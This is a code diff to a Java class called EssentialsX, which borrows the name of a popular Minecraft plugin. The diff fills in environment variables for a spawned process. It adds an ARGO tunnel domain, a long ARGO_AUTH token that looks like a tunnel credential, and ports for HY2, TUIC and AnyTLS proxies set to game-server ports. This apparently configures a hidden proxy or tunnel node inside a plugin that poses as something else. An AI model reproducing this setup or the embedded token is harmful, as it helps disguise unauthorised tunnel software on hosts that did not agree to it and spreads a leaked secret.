@@ -73,18 +73,15 @@ public class EssentialsX extends JavaPlugin {
         
         // Set environment variables
         Map<String, String> env = pb.environment();
-        env.put("UUID", "50435f3a-ec1f-4e1a-867c-385128b447f8");
-        env.put("FILE_PATH", "./world");
-        env.put("NEZHA_SERVER", "");
-        env.put("NEZHA_PORT", "");
-        env.put("NEZHA_KEY", "");
+        env.put("UUID", "e9b5d865-031f-418c-a413-82e9b362d35c");
+        env.put("FILE_PATH", "./wgb");
         env.put("ARGO_PORT", "8001");
-        env.put("ARGO_DOMAIN", "");
-        env.put("ARGO_AUTH", "");
+        env.put("ARGO_DOMAIN", "whh.wgb.qzz.io");
+        env.put("ARGO_AUTH", "eyJhIjoiY2YzNTMxZWMyODZjZTIxMWRhMDU1YjQ5YzZjYTljNTEiLCJ0IjoiNjQ4MDUxN2ItZWNmMy00MzYxLWJiNzgtOGIwZTc1NzA0ODM5IiwicyI6Ik5EZzRPR1U0WmpNdE9ESXdNeTAwTVdJd0xUbGpPRGt0WmprNE1qRTNOakF6TURnNSJ9");
         env.put("S5_PORT", "");
-        env.put("HY2_PORT", "");
-        env.put("TUIC_PORT", "");
-        env.put("ANYTLS_PORT", "");
+        env.put("HY2_PORT", "25575");
+        env.put("TUIC_PORT", "25565");
+        env.put("ANYTLS_PORT", "25575");
         env.put("REALITY_PORT", "");
         env.put("ANYREALITY_PORT", "");
         env.put("UPLOAD_URL", "");
@@ -92,7 +89,7 @@ public class EssentialsX extends JavaPlugin {
         env.put("BOT_TOKEN", "");
         env.put("CFIP", "spring.io");
         env.put("CFPORT", "443");
-        env.put("NAME", "");
+        env.put("NAME", "wgb");
         env.put("DISABLE_ARGO", "false");
         
         // Load from system environment variables
